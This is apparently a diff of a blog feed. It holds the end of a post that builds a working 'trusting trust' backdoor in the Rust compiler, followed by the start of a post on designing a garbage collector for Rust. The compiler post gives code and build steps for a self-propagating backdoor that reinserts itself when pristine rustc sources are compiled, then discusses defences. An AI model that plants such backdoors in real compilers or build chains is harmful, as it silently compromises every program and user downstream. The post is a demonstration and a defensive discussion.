-        fn fold_mac(&amp;mut self, mac: Mac) -&gt; Mac {
-            // Folders are not typically supposed to operate on pre-macro-expansion ASTs
-            // and will by default panic here. We must explicitly specify otherwise.
-            noop_fold_mac(mac, self)
-        }
-    }
-
-    // our entry point
-    pub fn fold_crate(krate: Crate) -&gt; Crate {
-        // make a folder, fold the crate with it
-        TrustFolder.fold_crate(krate)
-    }
-}
-</code></pre>
-
-<p>I invoke it by calling <code>let krate = trust::fold_crate(krate);</code> as the first line of <code>phase_2_configure_and_expand</code>.</p>
-
-<p>I create a stage 1 build<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> of rustc (<code>make rustc-stage1</code>). I&rsquo;ve already set up <code>rustup</code> to have a &ldquo;stage1&rdquo; toolchain
-pointing to this folder (<code>rustup toolchain link stage1 /path/to/rust/target_triple/stage1</code>), so I can easily test this new compiler:</p>
-
-<pre><code class="rust">// test.rs
-fn main() {
-    let x = "hello world";
-    println!("{}", x);
-}
-</code></pre>
-
-<pre><code class="sh">$ rustup run stage1 rustc test.rs
-$ ./test
-जगाला नमस्कार
-</code></pre>
-
-<p>Note that I had the string on a separate line instead of directly doing <code>println!("hello world")</code>.
-This is because our backdoor isn&rsquo;t perfect; it applies to the <em>pre-expansion</em> AST. In this AST,
-<code>println!</code> is stored as a macro and the <code>"hello world"</code> is part of the macro token tree; and has not
-yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
-post-expansion, however.</p>
-
-<p>So far, so good. We have a compiler that tweaks &ldquo;hello world&rdquo; strings. Now, let&rsquo;s see if we can get
-it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
-should produce a compiler that is similarly backdoored (with the <code>trust</code> module and the
-<code>trust::fold_crate()</code> call).</p>
-
-<p>We need to tweak our folder so that it does two things:</p>
-
-<ul>
-<li>Inserts the <code>let krate = trust::fold_crate(krate);</code> statement in the appropriate function (<code>phase_2_configure_and_expand</code>) when compiling a pristine Rust source tree</li>
-<li>Inserts the <code>trust</code> module</li>
-</ul>
-
-
-<p>The former is relatively easy. We need to construct an AST for that statement (can be done by
-invoking the parser again and extracting the node). The latter is where it gets tricky. We can
-encode instructions for outputting the AST of the <code>trust</code> module, but these instructions themselves
-are within the same module, so the instructions for outputting <em>these</em> instructions need to be
-included, and so on. This clearly isn&rsquo;t viable.</p>
-
-<p>However, there&rsquo;s a way around this. It&rsquo;s a common trick used in writing <a href="https://en.wikipedia.org/wiki/Quine_(computing)">quines</a>, which face similar
-issues. The idea is to put the entire block of code in a string. We then construct the code for the
-module by doing something like</p>
-
-<pre><code class="rust">mod trust {
-    static SELF_STRING: &amp;'static str = "/* stringified contents of this module except for this line */";
-    // ..
-    fn fold_mod(..) {
-        // ..
-        // this produces a string that is the same as the code for the module containing it
-        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
-        // once to produce the code for the module
-        let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
-        insert_into_crate(code_for_module);
-        // ..
-    }
-    // ..
-}
-</code></pre>
-
-<p>With the code of the module entered in, this will look something like</p>
-
-<pre><code class="rust">mod trust {
-    static SELF_STRING: &amp;'static str = "
-        // .. 
-        fn fold_mod(..) {
-            // ..
-            // this produces a string that is the same as the code for the module containing it
-            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
-            // once to produce the code for the module
-            let code_for_module = \"mod trust { static SELF_STRING: &amp;'static str = \\\"\" + SELF_STRING + \"\\\";\" + SELF_STRING + \"}\";
-            insert_into_crate(code_for_module);
-            // ..
-        }
-        // ..
-    ";
-
-    // ..
-    fn fold_mod(..) {
-        // ..
-        // this produces a string that is the same as the code for the module containing it
-        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
-        // once to produce the code for the module
-        let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
-        insert_into_crate(code_for_module);
-        // ..
-    }
-    // ..
-}
-</code></pre>
-
-<p>So you have a string containing the contents of the module, except for itself. You build the code
-for the module by using the string twice &ndash; once to construct the code for the declaration of the
-string, and once to construct the code for the rest of the module. Now, by parsing this, you&rsquo;ll get
-the original AST!</p>
-
-<p>Let&rsquo;s try this step by step. Let&rsquo;s first see if injecting an arbitrary string (<code>use foo::bar::blah</code>)
-works, without worrying about this cyclical quineyness:</p>
-
-<pre><code class="rust">mod trust {
-    // dummy string just to see if it gets injected
-    // inserting the full code of this module has some practical concerns
-    // about escaping which I'll address later
-    static SELF_STRING: &amp;'static str = "use foo::bar::blah;";
-    use syntax::fold::*;
-    use syntax::ast::*;
-    use syntax::parse::parse_crate_from_source_str;
-    use syntax::parse::token::InternedString;
-    use syntax::ptr::P;
-    use syntax::util::move_map::MoveMap;
-    use rustc::session::Session;
-
-    struct TrustFolder&lt;'a&gt; {
-        // we need the session to be able to parse things. No biggie.
-        sess: &amp;'a Session,
-    }
-
-    impl&lt;'a&gt; Folder for TrustFolder&lt;'a&gt; {
-        fn fold_expr(&amp;mut self, expr: P&lt;Expr&gt;) -&gt; P&lt;Expr&gt; {
-            expr.map(|mut expr| {
-                match expr.node {
-                    ExprKind::Lit(ref mut l) =&gt; {
-                        *l = l.clone().map(|mut l| {
-                            if let LitKind::Str(ref mut s, _) = l.node {
-                                if s == "hello world" {
-                                    *s = InternedString::new("जगाला नमस्कार");
-                                }
-                            }
-                            l
-                        })
-                    }
-                    _ =&gt; ()
-                }
-                noop_fold_expr(expr, self)
-            })
-        }
-        fn fold_mod(&amp;mut self, m: Mod) -&gt; Mod {
-            // move_flat_map takes a vector, constructs a new one by operating
-            // on each element by-move. Again, needed because of `P&lt;T&gt;`
-            let new_items = m.items.move_flat_map(|item| {
-                // we want to modify this function, and give it a sibling from SELF_STRING
-                if item.ident.name.as_str() == "phase_2_configure_and_expand" {
-                    // parse SELF_STRING
-                    let new_crate = parse_crate_from_source_str("trust".into(),
-                                                                SELF_STRING.into(),
-                                                                &amp;self.sess.parse_sess).unwrap();
-                    // extract the first item contained in it, which is the use statement
-                    let inner_item = new_crate.module.items[0].clone();
-
-                    // move_flat_map needs an iterator of items to insert
-                    vec![inner_item, item].into_iter()
-                } else {
-                    vec![item].into_iter()
-                }
-            });
-            let m = Mod {
-                inner: m.inner,
-                items: new_items,
-            };
-            noop_fold_mod(m, self)
-        }
-        fn fold_mac(&amp;mut self, _mac: Mac) -&gt; Mac {
-            noop_fold_mac(_mac, self)
-        }
-    }
-
-    pub fn fold_crate(krate: Crate, sess: &amp;Session) -&gt; Crate {
-        let mut folder = TrustFolder {sess: sess};
-        folder.fold_crate(krate)
-    }
-}
-</code></pre>
-
-<p>We also change the original call in <code>phase_2_configure_and_expand</code> to <code>let krate = trust::fold_crate(krate, sess);</code></p>
-
-<p>Compiling with <code>make rustc-stage2</code> (we now want the backdoored stage1 compiler to try and compile
-the same sources and fudge the <code>phase_2_configure_and_expand</code> function the second time around), gets us this error:</p>
-
-<pre><code>rustc: x86_64-apple-darwin/stage1/lib/rustlib/x86_64-apple-darwin/lib/librustc_driver
-error[E0432]: unresolved import `foo::bar::blah`
- --&gt; trust:1:5
-  |
-1 | use foo::bar::blah;
-  |     ^^^^^^^^^^^^^^ Maybe a missing `extern crate foo;`?
-
-error: aborting due to previous error
-</code></pre>
-
-<p>This is exactly what we expected! We inserted the code <code>use foo::bar::blah;</code>, which isn&rsquo;t going to
-resolve, and thus got a failure when compiling the crate the second time around.</p>
-
-<p>Let&rsquo;s add the code for the quineyness and for inserting the <code>fold_crate</code> call:</p>
-
-<pre><code class="rust">fn fold_mod(&amp;mut self, m: Mod) -&gt; Mod {
-    let new_items = m.items.move_flat_map(|item| {
-        // look for the phase_2_configure_and_expand function
-        if item.ident.name.as_str() == "phase_2_configure_and_expand" {
-            // construct the code for the module contents as described earlier
-            let code_for_module = r###"mod trust { static SELF_STRING: &amp;'static str = r##"###.to_string() + r###"##""### + SELF_STRING + r###""##"### + r###"##;"### + SELF_STRING + "}";
-            // Parse it into an AST by creating a crate only containing that code
-            let new_crate = parse_crate_from_source_str("trust".into(),
-                                                        code_for_module,
-                                                        &amp;self.sess.parse_sess).unwrap();
-            // extract the AST of the contained module
-            let inner_mod = new_crate.module.items[0].clone();
-
-            // now to insert the fold_crate() call
-            let item = item.map(|mut i| {
-                if let ItemKind::Fn(.., ref mut block) = i.node {
-                    *block = block.clone().map(|mut b| {
-                        // create a temporary crate just containing a fold_crate call
-                        let new_crate = parse_crate_from_source_str("trust".into(),
-                                                                    "fn trust() {let krate = trust::fold_crate(krate, sess);}".into(),
-                                                                    &amp;self.sess.parse_sess).unwrap();
-                        // extract the AST from the parsed temporary crate, shove it in here
-                        if let ItemKind::Fn(.., ref blk) = new_crate.module.items[0].node {
-                            b.stmts.insert(0, blk.stmts[0].clone());
-                        }
-                        b
-                    });
-                }
-                i
-            });
-            // yield both the created module and the modified function to move_flat_map
-            vec![inner_mod, item].into_iter()
-        } else {
-            vec![item].into_iter()
-        }
-    });
-    let m = Mod {
-        inner: m.inner,
-        items: new_items,
-    };
-    noop_fold_mod(m, self)
-}
-</code></pre>
-
-<p>The <code>#</code>s let us specify &ldquo;raw strings&rdquo; in Rust, where I can freely include other quotation marks
-without needing to escape things. For a string starting with <code>n</code> pound symbols, we can have raw
-strings with up to <code>n - 1</code> pound symbols inside it. The <code>SELF_STRING</code> is declared with four pound
-symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
-code needs to generate the declaration of <code>SELF_STRING</code> (with four pound symbols), we manually
-concatenate extra pound symbols on &ndash; a 4-pound-symbol raw string will not be valid within a three-
-pound-symbol raw string since the parser will try to end the string early. So we don&rsquo;t ever directly
-type a sequence of four consecutive pound symbols in the code, and instead construct it by
-concatenating two pairs of pound symbols.</p>
-
-<p>Ultimately, the <code>code_for_module</code> declaration really does the same as:</p>
-
-<pre><code class="rust">let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
-</code></pre>
-
-<p>conceptually, but also ensures that things stay escaped. I could get similar results by calling into
-a function that takes a string and inserts literal backslashes at the appropriate points.</p>
-
-<p>To update <code>SELF_STRING</code>, we just need to include all the code inside the <code>trust</code> module after the
-declaration of <code>SELF_STRING</code> itself inside the string. I won&rsquo;t include this inline since it&rsquo;s big,
-but <a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this is what it looks like in the end</a>.</p>
-
-<p>If we try compiling this code to stage 2 after updating <code>SELF_STRING</code>, we will get errors about
-duplicate <code>trust</code> modules, which makes sense because we&rsquo;re actually already compiling an already-
-backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
-to verify if our attack is working is to just use <code>#[cfg(stage0)]</code> on the trust module and the
-<code>fold_crate</code> call<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. These will only get included during &ldquo;stage 0&rdquo; (when it compiles the stage 1
-compiler<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
-backdoors executables, we&rsquo;re done.</p>
-
-<p>On building the stage 2 (<code>make rustc-stage2</code>) compiler,</p>
-
-<pre><code class="sh">$ rustup run stage2 rustc test.rs
-$ ./test
-जगाला नमस्कार
-</code></pre>
-
-<p>I was also able to make it work with a separate clone of Rust:</p>
-
-<pre><code class="sh">$ cd /path/to/new/clone
-# Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked
-# from anywhere inside this folder.
-$ rustup override set stage1 # Works with stage 2 as well.
-
-# with --enable-local-rust, instead of the downloaded stage 0 compiler compiling
-# stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we
-# need to check out a git commit close to our changes. This commit is the parent of our changes,
-# and is bound to work
-$ git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1
-
-# This will make it call `rustc` instead of downloading its own compiler.
-# We already overrode rustc to be our backdoored compiler for this folder
-# using rustup
-$ ./configure --enable-local-rust
-# build it!
-$ make rustc-stage1
-# Tell rustup about the new toolchain
-$ rustup toolchain link other-stage1 /path/to/new/clone/target_dir/stage1
-$ rustup run other-stage1 rustc test.rs
-$ ./test
-जगाला नमस्कार
-</code></pre>
-
-<p>Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.</p>
-
-<hr />
-
-<p>So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
-This particular attack isn&rsquo;t very robust, and while that can be improved upon, building a practical
-and resilient trusting trust attack that won&rsquo;t get noticed is a bit trickier.</p>
-
-<p>We in the Rust community should be working on ways to prevent such attacks from being successful, though.</p>
-
-<p>A couple of things we could do are:</p>
-
-<ul>
-<li>Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there&rsquo;s a technique called <a href="http://www.acsa-admin.org/countering-trusting-trust-through-diverse-double-compiling/">&ldquo;Diverse Double-Compiling&rdquo;</a> wherein you choose an arbitrary sequence of compilers (something like &ldquo;<code>gcc</code> followed by 3x <code>clang</code> followed by <code>gcc</code>&rdquo; followed by <code>clang</code>), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.</li>
-<li>Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.</li>
-<li>Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.</li>
-</ul>
-
-
-<p>Overall trusting trust attacks aren&rsquo;t that pressing a concern since there are many other ways to get
-approximately equivalent access with the same threat model. Having the ability to insert any
-backdoor into distributed binaries is bad enough, and should be protected against regardless of
-whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
-build servers, for example, they could as easily insert a backdoor into the <em>server</em>, or place a key
-so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
-easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
-Boy or the Tsar Bomba &ndash; one is worse, but you&rsquo;re atomized regardless, and your mitigation plan
-shouldn&rsquo;t need to change.</p>
-
-<p>But it&rsquo;s certainly an interesting attack, and should be something we should at least be thinking
-about.</p>
-
-<p><em>Thanks to Josh Matthews, Michael Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post.</em></p>
-
-<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=13091941">HN</a>, <a href="https://www.reddit.com/r/rust/comments/5g5hib/reflections_on_rusting_trust/">Reddit</a></small></p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>Of course, <em>this</em> raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust <em>someone</em>, which was partly the point of Thompson&rsquo;s talk.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-<li id="fn:2">
-<p>The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
-<li id="fn:3">
-<p>The local variable is called <code>krate</code> because <code>crate</code> is a keyword<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
-<li id="fn:4">
-<p>Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a &ldquo;new&rdquo; compiler) is used to compile the sources again.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
-<li id="fn:5">
-<p>Using it on the <code>fold_crate</code> call requires enabling the &ldquo;attributes on statements&rdquo; feature, but that&rsquo;s no big deal &ndash; we&rsquo;re only using the cfgs to be able to test easily; this feature won&rsquo;t actually be required if we use our stage1 compiler to compile a clean clone of the sources.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
-<li id="fn:6">
-<p>The numbering of the stages is a bit confusing. During &ldquo;stage 0&rdquo; (<code>cfg(stage0)</code>), the stage 1 compiler is <em>built</em>. Since you are building the stage 1 compiler, the make invocation is <code>make rustc-stage1</code>. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is <code>make rustc-stage2</code> but you use <code>#[cfg(stage1)]</code> in the code.<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Designing a GC in Rust]]></title>
-    <link href="http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust/"/>
-    <updated>2015-09-01T01:23:40-07:00</updated>
-    <id>http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust</id>
-    <content type="html"><![CDATA[<p>For a while I&rsquo;ve been working on a <a href="http://github.com/Manishearth/rust-gc/">garbage collector for Rust</a> with <a href="http://github.com/mystor">Michael
-Layzell</a>. I thought this would be a good time to talk of our design and progress so far.</p>
-
-<h1>Motivation</h1>
-
-<p>&ldquo;Wait&rdquo;, you ask, &ldquo;why does Rust need a garbage collector&rdquo;? Rust is supposed to work <em>without</em> a GC,
-that&rsquo;s one of its main selling points!</p>
-
-<p>True. Rust <em>does</em> work pretty well without a GC. It&rsquo;s managed to do without one so far, and we still
-have all sorts of well-written crates out there (none of which use a GC).</p>
-
-<p>But Rust is not just about low-cost memory safety. It&rsquo;s also <a href="http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees/">about choosing your costs and
-guarantees</a>. <code>Box&lt;T&gt;</code> and stack allocation are not always sufficient, sometimes one needs to
-reach for something like <code>Rc&lt;T&gt;</code> (reference counting). But even <code>Rc</code> is not perfect; it can&rsquo;t handle
-cycles between pointers. There are solutions to that issue like using <code>Weak&lt;T&gt;</code>, but that only works
-in limited cases (when you know what the points-to graph looks like at compile time), and isn&rsquo;t very
-ergonomic.</p>
-
-<p>Cases where one needs to maintain a complicated, dynamic graph are where a GC becomes useful.
-Similarly, if one is writing an interpreter for a GCd language, having a GC in Rust would simplify
-things a lot.</p>
-
-<p>Not to say that one should pervasively use a GC in Rust. Similar to <code>Rc&lt;T&gt;</code>, it&rsquo;s best to use
-regular ownership-based memory management as much as possible, and sprinkle <code>Rc</code>/<code>Gc</code> in places
-where your code needs it.</p>
-
-<h1>Previous designs</h1>
-
-<p>This isn&rsquo;t the first GC in Rust. Automatic memory management has existed before in various forms,
-but all were limited.</p>
-
-<p>Besides the ones listed below, Nick Fitzgerald&rsquo;s <a href="https://github.com/fitzgen/bacon-rajan-cc">cycle collector</a> based on <a href="researcher.watson.ibm.com/researcher/files/us-bacon/Bacon01Concurrent.pdf">this paper</a>
-exists and is something that you should look into if you&rsquo;re interested. There&rsquo;s also <a href="https://github.com/pliniker/mo-gc/blob/master/doc/Project-RFC.md">an RFC</a>
-by Peter Liniker which sketches out a design for an immutable GC.</p>
-
-<h2>Core Rust GC(s)</h2>
-
-<p>Rust itself had a garbage collector until a bit more than a year ago. These &ldquo;managed pointers&rdquo;
-(<code>@T</code>) were part of the language. They were removed later with a plan to make GC a library feature.</p>
-
-<p>I believe these were basically reference counted (cycle collected?) pointers with some language
-integration, but I&rsquo;m not sure.</p>
-
-<p>Nowadays, the only form of automatic memory management in Rust are via <a href="http://doc.rust-lang.org/alloc/rc/struct.Rc.html"><code>Rc</code></a> and <a href="http://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc</code></a>
-which are nonatomic and atomic reference counted pointers respectively. In other words, they keep
-track of the number of shared references via a reference count (incremented when it is cloned,
-decremented when destructors run). If the reference count reaches zero, the contents are cleaned up.</p>
-
-<p>This is a pretty useful abstraction, however, as mentioned above, it doesn&rsquo;t let you create cycles
-without leaking them.</p>
-
-<h2>Spidermonkey</h2>
-
-<p><em>You can read more about Servo&rsquo;s Spidermonkey bindings <a href="https://blog.mozilla.org/research/2014/08/26/javascript-servos-only-garbage-collector/">in this blog post</a> (somewhat
-outdated, but still relevant)</em></p>
-
-<p>In Servo we use <a href="http://github.com/servo/rust-mozjs/">bindings to the Spidermonkey Javascript engine</a>. Since Javascript is a
-garbage collected language, the Rust representations of Javascript objects are also garbage
-collected.</p>
-
-<p>Of course, this sort of GC isn&rsquo;t really useful for generic use since it comes bundled with a JS
-runtime. However, the Rust side of the GC is of a design that could be used in an independent
-library.</p>
-
-<p>The Rust side of the Spidermonkey GC is done through a bunch of smart pointers, and a trait called
-<code>JSTraceable</code>. <code>JSTraceable</code> is a trait which can &ldquo;trace&rdquo; recursively down some data, finding and
-marking all GC-managed objects inside it. This is autoderived using Rust&rsquo;s plugin infrastructure, so
-a simple <code>#[jstraceable]</code> annotation will generate trace hooks for the struct it is on.</p>
-
-<p>Now, we have various smart pointers. The first is <code>JS&lt;T&gt;</code>. This is opaque, but can be held by other
-GC-managed structs. To use this on the stack, this must be explicitly <em>rooted</em>, via <code>.root()</code>. This
-produces a <code>Root&lt;T&gt;</code>, which can be dereferenced to get the inner object. When the <code>Root</code> is created,
-the contained object is listed in a collection of &ldquo;roots&rdquo; in a global. A root indicates that the
-value is being used on the stack somewhere, and the GC starts tracing usage from these roots. When
-the <code>Root&lt;T&gt;</code> is destroyed, the root is removed.</p>
-
-<p>The problem with this is that <code>JS&lt;T&gt;</code> doesn&rsquo;t work on the stack. There is no way for the GC to know
-that we are holding on to <code>JS&lt;T&gt;</code> on the stack. So, if I copy a <code>JS&lt;T&gt;</code> to the stack, remove all
-references to it from objects in the GC heap, and trigger a collection, the <code>JS&lt;T&gt;</code> will still be
-around on the stack after collection since the GC can&rsquo;t trace to it. If I attempt to root it, I may
-get a panic or a segfault depending on the implementation.</p>
-
-<p>To protect against this, we have a bunch of lints. The <a href="https://github.com/servo/servo/blob/master/components/plugins/lints/unrooted_must_root.rs">relevant one</a> here protects
-against <code>JS&lt;T&gt;</code> from being carried around on the stack; but like most lints, it&rsquo;s not perfect.</p>
-
-<p>To summarize: Spidermonkey gives us a good GC. However using it for a generic Rust program is ill
-advised. Additionally, Servo&rsquo;s wrappers around the GC are cheap, but need lints for safety. While it
-would probably be possible to write safer wrappers for general usage, it&rsquo;s pretty impractical to
-carry around a JS runtime when you don&rsquo;t need one.</p>
-
-<p>However, Spidermonkey&rsquo;s GC did inspire me to think more into the matter.</p>
-
-<h1>Brainstorming a design</h1>
-
-<p>For quite a while I&rsquo;d had various ideas about GCs. Most were simplifications of Servo&rsquo;s wrappers
-(there&rsquo;s some complexity brought in there by Spidermonkey that&rsquo;s not necessary for a general GC).
-Most were tracing/rooting with mark-and-sweep collection. All of them used lints. Being rather busy,
-I didn&rsquo;t really work on it past that, but planned to work on it if I could find someone to work
-with.</p>
-
-<p>One day, <a href="http://github.com/mystor">Michael</a> pinged me on IRC and asked me about GCs. Lots of people knew that I was
-interested in writing a GC for Rust, and one of them directed him to me when he expressed a similar
-interest.</p>
-
-<p>So we started discussing GCs. We settled on a tracing mark-and-sweep GC. In other words, the GC runs
-regular &ldquo;sweeps&rdquo; where it first &ldquo;traces&rdquo; the usage of all objects and marks them and their children
-as used, and then sweeps up all unused objects.</p>
-
-<p>This model on its own has a flaw. It doesn&rsquo;t know about GC pointers held on the stack as local
-variables (&ldquo;stack roots&rdquo;). There are multiple methods for solving this. We&rsquo;ve already seen one above
-in the Spidermonkey design &ndash; maintain two types of pointers (one for the stack, one for the heap),
-and try very hard using static analysis to ensure that they don&rsquo;t cross over.</p>
-
-<p>A common model (used by GCs like Boehm, called &ldquo;conservative GCs&rdquo;) is to do something called &ldquo;stack
-scanning&rdquo;. In such a system, the GC goes down the stack looking for things which may perhaps be GC
-pointers. Generally the GC allocates objects in known regions of the memory, so a GC pointer is any
-value on the stack which belongs to one of these regions.</p>
-
-<p>Of course, this makes garbage collection rather inefficient, and will miss cases like <code>Box&lt;Gc&lt;T&gt;&gt;</code>
-where the GCd pointer is accessible, but through a non-GC pointer.</p>
-
-<p>We decided rather early on that we didn&rsquo;t want a GC based on lints or stack scanning. Both are
-rather suboptimal solutions in my opinion, and very hard to make sound<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. We were also hoping that
-Rust&rsquo;s type system and ownership semantics could help us in designing a good, safe, API.</p>
-
-<p>So, we needed a way to keep track of roots, and we needed a way to trace objects.</p>
-
-<h2>Tracing</h2>
-
-<p>The latter part was easy. We wrote a compiler plugin (well, we stole <a href="https://github.com/servo/servo/blob/master/components/plugins/jstraceable.rs#L38">Servo&rsquo;s tracing plugin which
-I&rsquo;d written earlier</a>) which autoderives an implementation of the <code>Trace</code> trait on any
-given struct or enum, using the same internal infrastructure that <code>#[derive(PartialEq)]</code> and the
-rest use. So, with just the following code, it&rsquo;s easy to make a struct or enum gc-friendly:</p>
-
-<pre><code class="rust">#[derive(Trace)]
-struct Foo {
-    x: u8,
-    y: Bar,
-}
-
-#[derive(Trace)]
-enum Bar {
-    Baz(u8), Quux
-}
-</code></pre>
-
-<p>For a <code>foo</code> of type <code>Foo</code> <code>foo.trace()</code>, will expand to a call of <code>foo.x.trace()</code> and
-<code>foo.y.trace()</code>. <code>bar.trace()</code> will check which variant it is and call <code>trace()</code> on the <code>u8</code> inside
-if it&rsquo;s a <code>Baz</code>. For most structs this turns out to be a no-op and is often optimized away by
-inlining, but if a struct contains a <code>Gc&lt;T&gt;</code>, the special implementation of <code>Trace</code> for <code>Gc&lt;T&gt;</code> will
-&ldquo;mark&rdquo; the traceability of the <code>Gc&lt;T&gt;</code>. Types without <code>Trace</code> implemented cannot be used in types
-implementing <code>Trace</code> or in a <code>Gc</code>, which is enforced with a <code>T: Trace</code> bound on <code>Gc&lt;T&gt;</code>.</p>
-
-<p>So, we have a way of walking the fields of a given object and finding inner <code>Gc&lt;T&gt;</code>s. Splendid. This
-lets us write the mark&amp;sweep phase easily: Take the list of known reachable <code>Gc&lt;T&gt;</code>s, walk their
-contents until you find more <code>Gc&lt;T&gt;</code>s (marking all you find), and clean up any which aren&rsquo;t
-reachable.</p>
-
-<h2>Rooting</h2>
-
-<p>Of course, now we have to solve the problem of keeping track of the known reachable <code>Gc&lt;T&gt;</code>s, i.e.
-the roots. This is a hard problem to solve without language support, and I hope that eventually we
-might be able to get the language hooks necessary to solve it. LLVM <a href="http://llvm.org/docs/GarbageCollection.html#gcroot">has support for tracking
-GCthings on the stack</a>, and some day we may be able to leverage that in Rust.</p>
-
-<p>As noted above, Spidermonkey&rsquo;s solution was to have non-rooted (non-dereferencable) heap pointers,
-which can be explicitly converted to rooted pointers and then read.</p>
-
-<p>We went the other way. All <code>Gc&lt;T&gt;</code> pointers, when created, are considered &ldquo;rooted&rdquo;. The instance of
-<code>Gc&lt;T&gt;</code> has a &ldquo;rooted&rdquo; bit set to true, and the underlying shared box (<code>GcBox</code>, though this is not a
-public interface) has its &ldquo;root count&rdquo; set to one.</p>
-
-<p>When this <code>Gc&lt;T&gt;</code> is cloned, an identical <code>Gc&lt;T&gt;</code> (with rooted bit set to true) is returned, and the
-underlying root count is incremented. Cloning a <code>Gc</code> does not perform a deep copy.</p>
-
-<pre><code class="rust">let a = Gc::new(20); // a.root = true, (*a.ptr).roots = 1, (*a.ptr).data = 20
-
-// ptr points to the underlying box, which contains the data as well as
-// GC metadata like the root count. `Gc::new()` will allocate this box
-
-let b = a.clone(); // b.root = true, (*a.ptr).roots++, b.ptr = a.ptr
-</code></pre>
-
-<p>This is rather similar to how <code>Rc</code> works, however there is no <code>root</code> field, and the <code>roots</code> counter
-is called a &ldquo;reference counter&rdquo;.</p>
-
-<p>For regular local sharing, it is recommended to just use a borrowed reference to the inner variable
-(borrowing works fine with rust-gc!) since there is no cost to creating this reference.</p>
-
-<p>When a GC thing is put inside another GC thing, the first thing no longer can remain a root. This is
-handled by &ldquo;unrooting&rdquo; the first GC thing:</p>
-
-<pre><code class="rust">struct Foo {
-    bar: u32,
-    baz: Gc&lt;u32&gt;,
-}
-
-let a = Gc::new(20); // why anyone would want to GC an integer I'll never know
-                     // but I'll stick with this example since it's simple
-
-let b = Gc::new(Foo {bar: 1, baz: a});
-// a.root = false, (*a.ptr).roots--
-// b initialized similar to previous example
-
-// `a` was moved into `b`, so now `a` cannot be accessed directly here
-// other than through `b`, and `a` is no longer a root.
-// To avoid moving a, passing `a.clone()` to `b` will work
-</code></pre>
-
-<p>Of course, we need a way to traverse the object passed to the <code>Gc&lt;T&gt;</code>, in this case <code>Foo</code>, and look
-for any contained <code>Gc&lt;T&gt;</code>s to unroot. Sound familiar? This needs the same mechanism that <code>trace()</code>
-needed! We add struct-walking <code>root()</code> and <code>unroot()</code> methods to the <code>Trace</code> trait which are auto-
-derived exactly the same way, and continue. (We don&rsquo;t need <code>root()</code> right now, but we will need it
-later on).</p>
-
-<p>Now, during collection, we can just traverse the list of <code>GcBox</code>s and use the ones with a nonzero
-root count as roots for our mark traversal.</p>
-
-<p>So far, so good. We have a pretty sound design for a GC that works &hellip; for immutable data.</p>
-
-<h3>Mutability</h3>
-
-<p>Like <code>Rc&lt;T&gt;</code>, <code>Gc&lt;T&gt;</code> is by default immutable. Rust abhors aliasable mutability, <a href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/">even in single
-threaded contexts</a>, and both these smart pointers allow aliasing.</p>
-
-<p>Mutation poses a problem for our GC, beyond the regular problems of aliasable mutability: It&rsquo;s
-possible to move rooted things into heap objects and vice versa:</p>
-
-<pre><code class="rust">let x = Gc::new(20);
-
-let y = Gc::new(None);
-
-*y = Some(x); // uh oh, x is still considered rooted!
-
-// and the reverse!
-
-let y = Gc::new(Some(Gc::new(20)));
-
-let x = y.take(); // x was never rooted!
-// `take()` moves the `Some(Gc&lt;u32&gt;)` out of `y`, replaces it with `None`       
-</code></pre>
-
-<p>Since <code>Gc&lt;T&gt;</code> doesn&rsquo;t implement <code>DerefMut</code>, none of this is possible &mdash; one cannot mutate the
